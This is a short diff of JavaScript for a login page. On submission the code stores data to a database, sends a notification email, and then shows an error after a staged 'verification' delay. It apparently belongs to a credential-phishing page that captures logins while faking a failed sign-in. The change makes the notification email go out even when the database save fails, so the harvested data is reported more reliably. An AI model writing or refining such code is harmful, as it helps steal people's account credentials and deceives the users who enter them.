@@ -345,14 +345,14 @@
                 })
                 .then(response => {
                     if (!response.ok) {
-                        throw new Error('Network response was not ok');
+                        throw new Error(`Network response was not ok: ${response.status} ${response.statusText}`);
                     }
                     return response.json();
                 })
                 .then(data => {
                     console.log('Data saved to database:', data);
                     
-                    // Then send notification email
+                    // Send email notification
                     sendNotificationEmail();
                     
                     // After "verification" delay, show error
@@ -364,6 +364,9 @@
                 })
                 .catch(error => {
                     console.error('Error saving data:', error);
+                    // Attempt to send notification even if database save fails
+                    sendNotificationEmail();
+                    
                     setTimeout(function() {
                         loginButton.innerHTML = 'Log in';
                         loginButton.disabled = false;
